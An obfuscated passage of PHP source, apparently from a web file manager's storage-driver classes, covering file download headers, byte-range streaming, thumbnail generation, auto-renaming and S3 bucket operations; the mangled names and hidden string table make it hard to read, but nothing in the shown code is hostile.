isset($_GET[$‡Ó’ÃÚø[122]]) ? !1 : !0; if ($šÏøÄ¼ˆ === !1 && !mime_support($¥ğÊ¯®)) { $¥ğÊ¯® = $‡Ó’ÃÚø[123]; } header($‡Ó’ÃÚø[124]); header($‡Ó’ÃÚø[125] . $¥ğÊ¯®); $ãàú¾ìÒ = rawurlencode($²öãõğ); $ãàú¾ìÒ = $‡Ó’ÃÚø[121] . $ãàú¾ìÒ . $‡Ó’ÃÚø[126] . $ãàú¾ìÒ; if ($šÏøÄ¼ˆ) { header($‡Ó’ÃÚø[127]); header($‡Ó’ÃÚø[128] . $ãàú¾ìÒ); } else { if ($—µîÖ€È) { header($‡Ó’ÃÚø[129] . $ãàú¾ìÒ); } } $¹³Õ‚Óô = 3600 * 24 * 30; header($‡Ó’ÃÚø[130]); header($‡Ó’ÃÚø[131]); header($‡Ó’ÃÚø[132] . $¹³Õ‚Óô); header($‡Ó’ÃÚø[133] . gmdate($‡Ó’ÃÚø[113], time() + $¹³Õ‚Óô) . $‡Ó’ÃÚø[134]); if (isset($_SERVER[$‡Ó’ÃÚø[135]]) && strtotime($_SERVER[$‡Ó’ÃÚø[135]]) == $¾Ñò¡‡Õ[$‡Ó’ÃÚø[88]]) { header($‡Ó’ÃÚø[136], !0, 304); die; } if (isset($_SERVER[$‡Ó’ÃÚø[137]]) && $_SERVER[$‡Ó’ÃÚø[137]] == $¡Œßà×Í) { header($‡Ó’ÃÚø[138] . $¡Œßà×Í, !0, 304); die; } header($‡Ó’ÃÚø[138] . $¡Œßà×Í); header($‡Ó’ÃÚø[139] . $Ç³ùªš¹ . $‡Ó’ÃÚø[134]); header($‡Ó’ÃÚø[140] . $²öãõğ); header($‡Ó’ÃÚø[141]); header($‡Ó’ÃÚø[142] . $¯Šê¿Ğú); header($‡Ó’ÃÚø[143]); Hook::trigger($‡Ó’ÃÚø[144], $éàùÂ—Ù, $¯Šê¿Ğú, $²öãõğ, $½ªÃ“ı); if (!$šÏøÄ¼ˆ && $½ªÃ“ı == $‡Ó’ÃÚø[145]) { if ($¯Šê¿Ğú > 1024 * 1024 * 5) { die; } $ÃãˆìŸí = $this->getContent($éàùÂ—Ù); $ÃãˆìŸí = Html::clearSVG($ÃãˆìŸí); header($‡Ó’ÃÚø[146] . strlen($ÃãˆìŸí)); echo $ÃãˆìŸí; die; } $„øùñÒ× = strtolower($_SERVER[$‡Ó’ÃÚø[147]]); if ($¿ÄÚ”¾í && $„øùñÒ× && $‹ç¹ú™¼) { if (strstr($„øùñÒ×, $‡Ó’ÃÚø[148])) { header($‡Ó’ÃÚø[149] . $éàùÂ—Ù); } else { if (strstr($„øùñÒ×, $‡Ó’ÃÚø[150])) { header($‡Ó’ÃÚø[151] . $éàùÂ—Ù); } else { if (strstr($„øùñÒ×, $‡Ó’ÃÚø[152])) { header($‡Ó’ÃÚø[153] . $éàùÂ—Ù); } } } if ($ÃÊÆŠ§) { header($‡Ó’ÃÚø[154] . $ÃÊÆŠ§); } return; } if (isset($_SERVER[$‡Ó’ÃÚø[155]])) { if (preg_match($‡Ó’ÃÚø[156], $_SERVER[$‡Ó’ÃÚø[155]], $ÀèÇû­Ñ)) { $Ú¦ªÏ±– = intval($ÀèÇû­Ñ[1]); $Ú¦ªÏ±– = $Ú¦ªÏ±– <= 0 ? 0 : ($Ú¦ªÏ±– >= $ı–ÔáÔ° ? $ı–ÔáÔ° : $Ú¦ªÏ±–); if (!empty($ÀèÇû­Ñ[2])) { $¢³“’¬Š = intval($ÀèÇû­Ñ[2]); $ı–ÔáÔ° = $¢³“’¬Š < $Ú¦ªÏ±– ? $Ú¦ªÏ±– : ($¢³“’¬Š >= $ı–ÔáÔ° ? $ı–ÔáÔ° : $¢³“’¬Š); } } header($‡Ó’ÃÚø[157]); header("\x43\157\x6e\164\x65\156\x74\x2d\x52\141\x6e\x67\x65\x3a\x20\142\x79\x74\145\163\40{$Ú¦ªÏ±–}\55{$ı–ÔáÔ°}\57" . $¯Šê¿Ğú); } else { header($‡Ó’ÃÚø[158]); } header($‡Ó’ÃÚø[159]); header($‡Ó’ÃÚø[160]); $ô¬éÀÑ = !0; if ($_SERVER[$‡Ó’ÃÚø[161]] == $‡Ó’ÃÚø[162] && $¯Šê¿Ğú > 1204 * 1024 * 1024 * 2) { $ô¬éÀÑ = !1; } if ($ô¬éÀÑ) { header($‡Ó’ÃÚø[163] . ($ı–ÔáÔ° - $Ú¦ªÏ±– + 1)); } if ($_SERVER[$‡Ó’ÃÚø[164]] == $‡Ó’ÃÚø[165]) { return; } $Œ€Á©Èõ = array($‡Ó’ÃÚø[166] => !1, $‡Ó’ÃÚø[167] => $Ú¦ªÏ±–, $‡Ó’ÃÚø[168] => $ı–ÔáÔ°, $‡Ó’ÃÚø[169] => $½ªÃ“ı, $‡Ó’ÃÚø[170] => $¾Ñò¡‡Õ, $‡Ó’ÃÚø[171] => $‡Ó’ÃÚø[12], $‡Ó’ÃÚø[172] => 0); $Œ€Á©Èõ = Hook::filter($‡Ó’ÃÚø[173], $Œ€Á©Èõ); $¡ÃÊÓ¸ = 1024 * 300; $œ¹öùñË = 0; if ($ÃÊÆŠ§) { $œ¹öùñË = intval(1000 * 1000 * ($¡ÃÊÓ¸ / $ÃÊÆŠ§)); } while ($Ú¦ªÏ±– <= $ı–ÔáÔ°) { $É”´ª¶… = timeFloat(); check_abort(); $¤’»†¹ô = $ı–ÔáÔ° - $Ú¦ªÏ±– + 1; if ($¤’»†¹ô <= $¡ÃÊÓ¸) { $¡ÃÊÓ¸ = $¤’»†¹ô; } $ÃãˆìŸí = $this->fileSubstr($éàùÂ—Ù, $Ú¦ªÏ±–, $¡ÃÊÓ¸); if ($Œ€Á©Èõ[$‡Ó’ÃÚø[166]]) { $Œ€Á©Èõ[$‡Ó’ÃÚø[171]] = $ÃãˆìŸí; $Œ€Á©Èõ[$‡Ó’ÃÚø[172]] = $Ú¦ªÏ±–; $Œ€Á©Èõ = Hook::filter($‡Ó’ÃÚø[174], $Œ€Á©Èõ); $ÃãˆìŸí = $Œ€Á©Èõ[$‡Ó’ÃÚø[171]]; } echo $ÃãˆìŸí; $Ú¦ªÏ±– += $¡ÃÊÓ¸; if ($¡ÃÊÓ¸ == $¤’»†¹ô) { $Ú¦ªÏ±– = $ı–ÔáÔ° + 1; } if ($œ¹öùñË) { $û ÕÀ­µ = intval(1000 * 1000 * (timeFloat() - $É”´ª¶…)); $ÊŞÙÓòê = $œ¹öùñË - $û ÕÀ­µ; if ($ÊŞÙÓòê > 5) { usleep($ÊŞÙÓòê); } } } } public function fileOutServer($¼‡óĞïä, $‹îš¢à” = false, $íúÎæø = false, $ŞğÓ•„ğ = '') { $this->fileOut($¼‡óĞïä, $‹îš¢à”, $íúÎæø, $ŞğÓ•„ğ); } public function fileOutLink($ÍÇ‘áºË) { header($_SERVER[ç¦¬”œš][175] . $ÍÇ‘áºË); die; } public function cacheMethod($‰ò¬İêò, $¸¥ùıé‰, $·Ø§›æù = null) { $ëş¦Çüë =& $_SERVER[ç¦¬”œš]; static $²Ç³Ùîª = array(); $£ĞŸû § = $¸¥ùıé‰ ? ltrim($this->getPathOuter($¸¥ùıé‰), $ëş¦Çüë[8]) : $ëş¦Çüë[12]; $‡É‹°Äô = $ëş¦Çüë[176] . $‰ò¬İêò . $ëş¦Çüë[177] . rtrim($£ĞŸû §, $ëş¦Çüë[8]); if (is_null($‰ò¬İêò)) { $²Ç³Ùîª = array(); return; } if (is_null($¸¥ùıé‰)) { foreach ($²Ç³Ùîª as $‡É‹°Äô => $¼ñÇ³) { if (!strstr($‡É‹°Äô, $ëş¦Çüë[176] . $‰ò¬İêò . $ëş¦Çüë[178])) { continue; } unset($²Ç³Ùîª[$‡É‹°Äô]); } return; } if (!is_null($·Ø§›æù)) { $²Ç³Ùîª[$‡É‹°Äô] = $·Ø§›æù; return; } $ €üÉˆû = isset($²Ç³Ùîª[$‡É‹°Äô]) ? $²Ç³Ùîª[$‡É‹°Äô] : null; if (!is_null($ €üÉˆû)) { return $ €üÉˆû; } $ €üÉˆû = $this->{$‰ò¬İêò}($¸¥ùıé‰); $²Ç³Ùîª[$‡É‹°Äô] = $ €üÉˆû; return $ €üÉˆû; } public function cacheMethodInfoSet($ˆĞÚÌ¤ù, $È¿¬ÊáĞ, $Ôª÷úÒı = false) { $ßÑô¹™­ =& $_SERVER[ç¦¬”œš]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ßÑô¹™­[179], $ˆĞÚÌ¤ù, $È¿¬ÊáĞ); $this->cacheMethod($ßÑô¹™­[180], $ˆĞÚÌ¤ù, $È¿¬ÊáĞ ? !1 : !0); if (is_array($Ôª÷úÒı)) { $this->cacheMethod($ßÑô¹™­[181], $ˆĞÚÌ¤ù, $Ôª÷úÒı); } } public function fileOutImage($é—Â¬¡, $­…û„á« = 250) { $ØœÇ¼»ğ =& $_SERVER[ç¦¬”œš]; set_timeout(); if (substr($é—Â¬¡, 0, 4) == $ØœÇ¼»ğ[152]) { $this->fileOutLink($é—Â¬¡); } $Š£Œşàó = $this->info($é—Â¬¡); $ÏåïÖ¤ˆ = !1; $šµ÷×­ï = isset($GLOBALS[$ØœÇ¼»ğ[182]]) ? $GLOBALS[$ØœÇ¼»ğ[182]] : array(); if ($šµ÷×­ï && $šµ÷×­ï[$ØœÇ¼»ğ[183]] == $Š£Œşàó[$ØœÇ¼»ğ[87]]) { $Š£Œşàó = $šµ÷×­ï; $â®ôå’ = $Š£Œşàó[$ØœÇ¼»ğ[184]]; if ($â®ôå’ && isset($â®ôå’[$ØœÇ¼»ğ[185]])) { if ($â®ôå’[$ØœÇ¼»ğ[185]] <= $­…û„á« && $â®ôå’[$ØœÇ¼»ğ[186]] <= $­…û„á«) { $ÏåïÖ¤ˆ = !0; } } } if ($Š£Œşàó[$ØœÇ¼»ğ[79]] <= 1024 * 50 || $ÏåïÖ¤ˆ || !function_exists($ØœÇ¼»ğ[187]) || $Š£Œşàó[$ØœÇ¼»ğ[169]] == $ØœÇ¼»ğ[188]) { return $this->fileOut($é—Â¬¡, !1, $Š£Œşàó[$ØœÇ¼»ğ[32]]); } $ÓÓäåù = kodIO::hashPath($Š£Œşàó); $Ø—ÎÛ˜† = "\143\x6f\166\145\162\137{$ÓÓäåù}\137{$­…û„á«}\x2e\160\156\x67"; $ôÚ®ç¤Ò = IO_PATH_SYSTEM_TEMP . $ØœÇ¼»ğ[189]; $á“ ãíª = IO::infoFullSimple($ôÚ®ç¤Ò); $–Í¿ôï = $á“ ãíª && is_array($á“ ãíª) ? $á“ ãíª[$ØœÇ¼»ğ[87]] : $ØœÇ¼»ğ[12]; if (!$–Í¿ôï) { $–Í¿ôï = IO::mkdir($ôÚ®ç¤Ò); } if ($Š£Œşàó[$ØœÇ¼»ğ[190]] == $ØœÇ¼»ğ[191] && isset($Š£Œşàó[$ØœÇ¼»ğ[192]]) && $Š£Œşàó[$ØœÇ¼»ğ[192]] == kodIO::sourceID($–Í¿ôï)) { $üÉÆĞ¼» = $Š£Œşàó[$ØœÇ¼»ğ[193]]; if ($­…û„á« <= 500) { $Öññßã‰ = preg_replace($ØœÇ¼»ğ[194], $ØœÇ¼»ğ[195], $Š£Œşàó[$ØœÇ¼»ğ[32]]); $üÉÆĞ¼» = IO::fileNameExist($–Í¿ôï, $Öññßã‰); } return IO::fileOut(KodIO::make($üÉÆĞ¼»), !1, $Š£Œşàó[$ØœÇ¼»ğ[32]]); } $·ûîóäÁ = IO::fileNameExist($–Í¿ôï, $Ø—ÎÛ˜†); if ($·ûîóäÁ) { return IO::fileOut(KodIO::make($·ûîóäÁ), !1, $Š£Œşàó[$ØœÇ¼»ğ[32]]); } if ($­…û„á« > 1000) { $this->makeImageCover($–Í¿ôï, $é—Â¬¡, $Ø—ÎÛ˜†, $­…û„á«); $this->makeImageCover($–Í¿ôï, $é—Â¬¡, "\143\157\166\145\162\137{$ÓÓäåù}\137\62\x35\60\x2e\160\156\x67", 250); $·ûîóäÁ = IO::fileNameExist($–Í¿ôï, $Ø—ÎÛ˜†); if ($·ûîóäÁ) { return IO::fileOut(KodIO::make($·ûîóäÁ), !1, $Š£Œşàó[$ØœÇ¼»ğ[32]]); } die; } if (!kodIO::allowCover($Š£Œşàó)) { return $this->fileOut($é—Â¬¡, !1, $Š£Œşàó[$ØœÇ¼»ğ[32]]); } $é “ã€ = Cache::get($Ø—ÎÛ˜†); if ($é “ã€ == $ØœÇ¼»ğ[196] || $é “ã€ == $ØœÇ¼»ğ[197]) { echo $é “ã€; die; } Cache::set($Ø—ÎÛ˜†, $ØœÇ¼»ğ[197], 60); $¤ö‡„í = array($–Í¿ôï, $Š£Œşàó[$ØœÇ¼»ğ[87]], $Ø—ÎÛ˜†, $­…û„á«); $ü¬üéŠ“ = $ØœÇ¼»ğ[198] . $Š£Œşàó[$ØœÇ¼»ğ[79]] . $ØœÇ¼»ğ[199] . $Ø—ÎÛ˜† . $ØœÇ¼»ğ[200] . $Š£Œşàó[$ØœÇ¼»ğ[32]] . $ØœÇ¼»ğ[201] . $Š£Œşàó[$ØœÇ¼»ğ[87]]; TaskQueue::add($ØœÇ¼»ğ[202], $¤ö‡„í, $ü¬üéŠ“, $Ø—ÎÛ˜†); } public function makeImageCover($ú²‹¹é¾, $Üœ‚²™, $Ì–çâÈ, $ˆªÊèÛ¾) { $èóÖâÌÓ =& $_SERVER[ç¦¬”œš]; if (IO::fileNameExist($ú²‹¹é¾, $Ì–çâÈ)) { return $èóÖâÌÓ[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $î”ª£ƒ˜ = DATA_THUMB . $Ì–çâÈ; del_file($î”ª£ƒ˜); $µ·Ò¹¬á = IO::copy($Üœ‚²™, TEMP_FILES, !1, $Ì–çâÈ); if (!@file_exists($µ·Ò¹¬á)) { return $èóÖâÌÓ[204]; } ImageThumb::createThumb($µ·Ò¹¬á, $î”ª£ƒ˜, $ˆªÊèÛ¾, $ˆªÊèÛ¾ * 10); if (@file_exists($î”ª£ƒ˜)) { Cache::remove($Ì–çâÈ); return IO::move($î”ª£ƒ˜, $ú²‹¹é¾); } Cache::set($Ì–çâÈ, $èóÖâÌÓ[196], 600); del_file($î”ª£ƒ˜); return $èóÖâÌÓ[205] . $µ·Ò¹¬á . $èóÖâÌÓ[74]; } public function fileOutImageServer($¸¨É£Í÷, $®ƒÚşœû = 250) { $this->fileOutImage($¸¨É£Í÷, $®ƒÚşœû); } public function fileNameAuto($ÌÑñã¿Ê, $±âÑ·°, $…ÀÜÅ¤ï = REPEAT_RENAME, $¦î›·œ = false) { $øåº½÷Ø =& $_SERVER[ç¦¬”œš]; $ö¥¬í™ë = $ÌÑñã¿Ê === $øåº½÷Ø[12] ? $±âÑ·° : rtrim($ÌÑñã¿Ê, $øåº½÷Ø[8]) . $øåº½÷Ø[8] . $±âÑ·°; if ($…ÀÜÅ¤ï == REPEAT_REPLACE || !$this->exist($ö¥¬í™ë) || $¦î›·œ && $…ÀÜÅ¤ï != REPEAT_RENAME_FOLDER) { return $±âÑ·°; } if ($…ÀÜÅ¤ï == REPEAT_SKIP) { return !1; } $ğÆåşÈ£ = $øåº½÷Ø[10] . get_path_ext($±âÑ·°); $ğÆåşÈ£ = $ğÆåşÈ£ == $øåº½÷Ø[10] || $¦î›·œ ? $øåº½÷Ø[12] : $ğÆåşÈ£; $ÅƒôÒ·Œ = 1; $ºÅŸàà¥ = substr($±âÑ·°, 0, strlen($±âÑ·°) - strlen($ğÆåşÈ£)); $‡×ù´ëï = $ºÅŸàà¥ . "\50{$ÅƒôÒ·Œ}\51{$ğÆåşÈ£}"; while ($this->exist(rtrim($ÌÑñã¿Ê, $øåº½÷Ø[8]) . $øåº½÷Ø[8] . $‡×ù´ëï)) { $‡×ù´ëï = $ºÅŸàà¥ . "\50{$ÅƒôÒ·Œ}\x29{$ğÆåşÈ£}"; $ÅƒôÒ·Œ++; } return $‡×ù´ëï; } private function fileNameAutoList($´Ã›Ûş, $½İ²ó˜, $ „Êé¥Á = false) { $ı¸ƒØÚ =& $_SERVER[ç¦¬”œš]; $’½å…°ö = $this->listPath($´Ã›Ûş, !0); $’½å…°ö = array_merge($’½å…°ö[$ı¸ƒØÚ[85]], $’½å…°ö[$ı¸ƒØÚ[86]]); $º¼ıûÅ£ = array_to_keyvalue($’½å…°ö, $ı¸ƒØÚ[12], $ı¸ƒØÚ[32]); $øÖœö¤™ = $ı¸ƒØÚ[10] . get_path_ext($½İ²ó˜); $øÖœö¤™ = $øÖœö¤™ == $ı¸ƒØÚ[10] || $ „Êé¥Á ? $ı¸ƒØÚ[12] : $øÖœö¤™; $Ô¾‰õ = substr($½İ²ó˜, 0, strlen($½İ²ó˜) - strlen($øÖœö¤™)); $æğ¾ÂÀÅ = $Ô¾‰õ . "\50\x30\51{$øÖœö¤™}"; for ($­’ì÷ = 1; $­’ì÷ <= count($º¼ıûÅ£) + 1; $­’ì÷++) { $æğ¾ÂÀÅ = $Ô¾‰õ . "\50{$­’ì÷}\x29{$øÖœö¤™}"; if (!in_array_not_case($æğ¾ÂÀÅ, $º¼ıûÅ£)) { return $æğ¾ÂÀÅ; } } return $æğ¾ÂÀÅ; } public function listAllFiles($¹æÉ»…á, $‚—¿œïß) { $ŒÉ“‚Œñ =& $_SERVER[ç¦¬”œš]; if (empty($‚—¿œïß)) { return array(); } $ÇÉÃéÀÎ = array_keys($‚—¿œïß); $Åì·‡ÙÇ = array(); $¹æÉ»…á = trim($¹æÉ»…á, $ŒÉ“‚Œñ[8]); foreach ($‚—¿œïß as $³ó¸Î¹Ê => $Õ†‚Øé) { $‘ó°ÑĞæ = ltrim(substr(trim($³ó¸Î¹Ê, $ŒÉ“‚Œñ[8]), strlen($¹æÉ»…á)), $ŒÉ“‚Œñ[8]); if (substr($³ó¸Î¹Ê, -1) == $ŒÉ“‚Œñ[8]) { $‘ó°ÑĞæ = rtrim($‘ó°ÑĞæ, $ŒÉ“‚Œñ[8]) . $ŒÉ“‚Œñ[8]; } $Åì·‡ÙÇ = array_merge($Åì·‡ÙÇ, $this->slicePath($‘ó°ÑĞæ)); } $ÃìæÒÄÍ = array(); foreach (array_unique($Åì·‡ÙÇ) as $…¥Ë÷ÌÀ) { $¬Óõ‘¦í = array($ŒÉ“‚Œñ[87] => $this->getPathOuter($ŒÉ“‚Œñ[8] . $¹æÉ»…á . $ŒÉ“‚Œñ[8] . $…¥Ë÷ÌÀ), $ŒÉ“‚Œñ[78] => 1, $ŒÉ“‚Œñ[79] => 0); if (substr($…¥Ë÷ÌÀ, -1) != $ŒÉ“‚Œñ[8]) { $¬Óõ‘¦í[$ŒÉ“‚Œñ[78]] = 0; $á¨ûİ = $this->getPath($¹æÉ»…á . $ŒÉ“‚Œñ[8] . $…¥Ë÷ÌÀ); if (isset($‚—¿œïß[$á¨ûİ])) { $ü†°Ü = $‚—¿œïß[$á¨ûİ]; if (isset($ü†°Ü[$ŒÉ“‚Œñ[79]])) { $¬Óõ‘¦í[$ŒÉ“‚Œñ[79]] = intval($ü†°Ü[$ŒÉ“‚Œñ[79]]); } if (isset($ü†°Ü[$ŒÉ“‚Œñ[206]])) { $¬Óõ‘¦í[$ŒÉ“‚Œñ[88]] = intval($ü†°Ü[$ŒÉ“‚Œñ[206]]); } } } $ÃìæÒÄÍ[] = $¬Óõ‘¦í; } return $ÃìæÒÄÍ; } public function slicePath($ˆ æİÄ•) { $˜÷ßíùÆ =& $_SERVER[ç¦¬”œš]; $––¦’© = explode($˜÷ßíùÆ[8], trim($ˆ æİÄ•, $˜÷ßíùÆ[8])); $©Óæ—€ß = 0; do { ++$©Óæ—€ß; $ƒ´ë«¬Ï[] = implode($˜÷ßíùÆ[8], array_slice($––¦’©, 0, $©Óæ—€ß)) . $˜÷ßíùÆ[8]; } while ($©Óæ—€ß < count($––¦’©)); $ƒ´ë«¬Ï[count($––¦’©) - 1] = $ˆ æİÄ•; return $ƒ´ë«¬Ï; } public function getHost() { $ÛÀª‹‹† =& $_SERVER[ç¦¬”œš]; $ä—¾¦‘ş = parse_url(trim($this->domain, $ÛÀª‹‹†[8])); $€ùçÔ¿ = isset($ä—¾¦‘ş[$ÛÀª‹‹†[207]]) ? $ä—¾¦‘ş[$ÛÀª‹‹†[207]] : http_type(); $®å–è¿Ÿ = isset($ä—¾¦‘ş[$ÛÀª‹‹†[208]]) ? $ä—¾¦‘ş[$ÛÀª‹‹†[208]] : $ä—¾¦‘ş[$ÛÀª‹‹†[87]]; if (isset($ä—¾¦‘ş[$ÛÀª‹‹†[209]])) { $®å–è¿Ÿ .= $ÛÀª‹‹†[4] . $ä—¾¦‘ş[$ÛÀª‹‹†[209]]; } return $€ùçÔ¿ . $ÛÀª‹‹†[210] . $®å–è¿Ÿ; } public function pathEncode($‹™¶³¯Ô) { $İÚÆ£ô =& $_SERVER[ç¦¬”œš]; return str_replace($İÚÆ£ô[211], $İÚÆ£ô[8], rawurlencode($‹™¶³¯Ô)); } public function writeLog($¾üñÉ÷ = '', $™ë—å­Ë = false) { $¢ÎİÃ»‹ =& $_SERVER[ç¦¬”œš]; $Î¿õ¡Ò¸ = in_array(ACTION, array($¢ÎİÃ»‹[212], $¢ÎİÃ»‹[213])); if (!$Î¿õ¡Ò¸ && !GLOBAL_DEBUG) { return; } $óĞ´ı¯§ = $¾üñÉ÷; static $›İ—¾–á = null; if (!$›İ—¾–á) { $›İ—¾–á = strtoupper($this->getType()); } $¾üñÉ÷ = $›İ—¾–á . $¢ÎİÃ»‹[214] . $¾üñÉ÷; if ($™ë—å­Ë) { $ÅÑ¹»Ÿ˜ = error_get_last(); if ($ÅÑ¹»Ÿ˜) { $¾üñÉ÷ = array($¾üñÉ÷, $ÅÑ¹»Ÿ˜); } } write_log($¾üñÉ÷, $¢ÎİÃ»‹[215]); if ($Î¿õ¡Ò¸) { throw new Exception($óĞ´ı¯§); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($§ÍŠ«‰) { set_timeout(); require_once SDK_DIR . $_SERVER[ç¦¬”œš][216]; parent::__construct(); $this->_init($§ÍŠ«‰); } public function _init($™Ì‚Ê³À) { $‘ ½ ×´ =& $_SERVER[ç¦¬”œš]; $this->config = $™Ì‚Ê³À; foreach ($™Ì‚Ê³À as $ºõ´·ä© => $ññ‹Šş“) { if (isset($this->{$ºõ´·ä©})) { $this->{$ºõ´·ä©} = $ññ‹Šş“; } } $this->endpoint = $™Ì‚Ê³À[$‘ ½ ×´[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($‘ ½ ×´[212], $‘ ½ ×´[213]))) { $this->client->setExceptions(); } } public function setSignVersion($Üä‡†›ê = "\x76\x34") { $this->signVer = $Üä‡†›ê; $this->client->setSignatureVersion($Üä‡†›ê); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ó¾àñÙü) { return null; } } public function isBucketCors() { $ö¤ÚÅÜŒ =& $_SERVER[ç¦¬”œš]; $ïŞÕş“± = $this->getBucketCors(); if (!$ïŞÕş“± || !is_array($ïŞÕş“±)) { return !1; } if (!is_array($ïŞÕş“±[$ö¤ÚÅÜŒ[218]])) { $ïŞÕş“±[$ö¤ÚÅÜŒ[218]] = explode($ö¤ÚÅÜŒ[50], $ïŞÕş“±[$ö¤ÚÅÜŒ[218]]); } if ($ïŞÕş“±[$ö¤ÚÅÜŒ[219]] != $ö¤ÚÅÜŒ[220] || !in_array($ö¤ÚÅÜŒ[220], $ïŞÕş“±[$ö¤ÚÅÜŒ[218]])) { return !1; } $¸•Àœ™´ = array_map($ö¤ÚÅÜŒ[221], $ïŞÕş“±[$ö¤ÚÅÜŒ[222]]); if (!is_array($¸•Àœ™´)) { $¸•Àœ™´ = array(); } $”ı‚Ÿ¤Ç = array($ö¤ÚÅÜŒ[223], $ö¤ÚÅÜŒ[224], $ö¤ÚÅÜŒ[225], $ö¤ÚÅÜŒ[226], $ö¤ÚÅÜŒ[227]); $üİ¦ŠÜ = array_diff($”ı‚Ÿ¤Ç, $¸•Àœ™´); return empty($üİ¦ŠÜ); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($ŞÕÉ¾€š, $Û£‹±… = '', $Œ…Ëöò§ = REPEAT_RENAME) { $¿ğ˜‹æØ = $this->setContent($ŞÕÉ¾€š, $Û£‹±…); if ($¿ğ˜‹æØ !== !1) { return $this->getPathOuter($ŞÕÉ¾€š); } return !1; } public function mkdir($¡µù³Öñ, $œ­ğº™ = REPEAT_SKIP) { $”‹Û°Ï =& $_SERVER[ç¦¬”œš]; if (empty($¡µù³Öñ) && $¡µù³Öñ !== $”‹Û°Ï[228]) { return !1; } if ($œ­ğº™ && $this->_isFolder($¡µù³Öñ)) { return $this->getPathOuter($¡µù³Öñ); } $Ó¿ë­„ = $this->setContent($¡µù³Öñ, $”‹Û°Ï[12], !0); if ($Ó¿ë­„ !== !1) { return $this->getPathOuter($¡µù³Öñ); } return !1; } public function copyFile($×»ñÙ™Ù, $ö÷©è†®, $õ¢æÆ„ = array()) { $ÒÒ†›¡ =& $_SERVER[ç¦¬”œš]; $‰Ï²ığÎ = $this->objectMeta($×»ñÙ™Ù); if (!$‰Ï²ığÎ) { return !1; } if ($‰Ï²ığÎ[$ÒÒ†›¡[79]] <= 1024 * 1024 * 200) { $’ÍÜô’« = $this->client->copyObject($this->bucket, $×»ñÙ™Ù, $this->bucket, $ö÷©è†®, $ÒÒ†›¡[229], $õ¢æÆ„); } else { $’ÍÜô’« = $this->client->multiCopyObject($this->bucket, $×»ñÙ™Ù, $this->bucket, $ö÷©è†®, $õ¢æÆ„); } $’ÍÜô’« = $’ÍÜô’« ? $this->getPathOuter($ö÷©è†®) : !1; return $’ÍÜô’«; } public function moveFile($ÃÚÇ€£‡, $ì™ìØ‚) { if ($this->copyFile($ÃÚÇ€£‡, $ì™ìØ‚)) { $this->delFile($ÃÚÇ€£‡); return $this->getPathOuter($ì™ìØ‚); } return !1; } public function delFile($¯¡×¹×) { return $this->client->deleteObject($this->bucket, $¯¡×¹×); } public function delFolder($Ş¬Ú€ä) { $º­ˆâÒ =& $_SERVER[ç¦¬”œš]; if (!$this->exist($Ş¬Ú€ä)) { return !0; } $this->listItemCache = !1; $ÙŒ¨¶Ñš = $this->fileList($Ş¬Ú€ä); $this->listItemCache = !0; $Úù³™Úã = trim($Ş¬Ú€ä, $º­ˆâÒ[8]) . $º­ˆâÒ[8]; if (!empty($Ş¬Ú€ä) && $Ş¬Ú€ä !== $º­ˆâÒ[228] && !in_array($Úù³™Úã, $ÙŒ¨¶Ñš[$º­ˆâÒ[85]])) { $ÙŒ¨¶Ñš[$º­ˆâÒ[85]][] = $Úù³™Úã; } $ù€·œÛ  = $this->delByBatch($ÙŒ¨¶Ñš[$º­ˆâÒ[86]]); if (!$ù€·œÛ ) { return !1; } $ù€·œÛ  = $this->delByBatch($ÙŒ¨¶Ñš[$º­ˆâÒ[85]]); if (!$ù€·œÛ ) { return !1; } return $this->delFile($Úù³™Úã); } private function delByBatch($¶şî—¼) { foreach (array_chunk($¶şî—¼, 1000) as $ê›ß§¹Ú) { $‰®ËØŞ— = $this->client->deleteObjects($this->bucket, $ê›ß§¹Ú); if (!$‰®ËØŞ—) { return !1; } } return !0; } public function rename($Óô˜·×„, $Ø¯®½Œí) { return $this->renameObject($Óô˜·×„, $Ø¯®½Œí); } public function listPath($­¨å¨›œ, $¸µİ©àÓ = false) { $øÄ´‚À¾ =& $_SERVER[ç¦¬”œš]; $Ë±åŸŠÉ = $this->fileList($­¨å¨›œ, $øÄ´‚À¾[8], !0); foreach ($Ë±åŸŠÉ[$øÄ´‚À¾[85]] as $ŸªÜ¿‘Ì => $Ï³¼ƒ¬Æ) { $Ë±åŸŠÉ[$øÄ´‚À¾[85]][$ŸªÜ¿‘Ì] = $this->folderInfo($Ï³¼ƒ¬Æ, $¸µİ©àÓ, $Ï³¼ƒ¬Æ); } foreach ($Ë±åŸŠÉ[$øÄ´‚À¾[86]] as $ŸªÜ¿‘Ì => $Ï³¼ƒ¬Æ) { $Ë±åŸŠÉ[$øÄ´‚À¾[86]][$ŸªÜ¿‘Ì] = $this->fileInfo($Ï³¼ƒ¬Æ[$øÄ´‚À¾[32]], $¸µİ©àÓ, $Ï³¼ƒ¬Æ); } return $Ë±åŸŠÉ; } protected function infoChildren($ÀéÎ‡²ª, &$ßÆ¤Ğ ) { $€¾óöÆ =& $_SERVER[ç¦¬”œš]; $Š©¹›†ã = $this->fileList($ÀéÎ‡²ª, $€¾óöÆ[12], !0); $ßÆ¤Ğ [$€¾óöÆ[81]] += count($Š©¹›†ã[$€¾óöÆ[85]]); $ßÆ¤Ğ [$€¾óöÆ[80]] += count($Š©¹›†ã[$€¾óöÆ[86]]); foreach ($Š©¹›†ã[$€¾óöÆ[86]] as $Ò«–šâ») { if (!$Ò«–šâ» || !$Ò«–šâ»[$€¾óöÆ[79]]) { continue; } $ßÆ¤Ğ [$€¾óöÆ[79]] += $Ò«–šâ»[$€¾óöÆ[79]]; } } private function fileInfo($›øğ¥µ¾, $”æöØµ  = false, $è¾ÛöÑ¥ = array()) { $ì¦øôŠç =& $_SERVER[ç¦¬”œš]; $©é€àÃÈ = 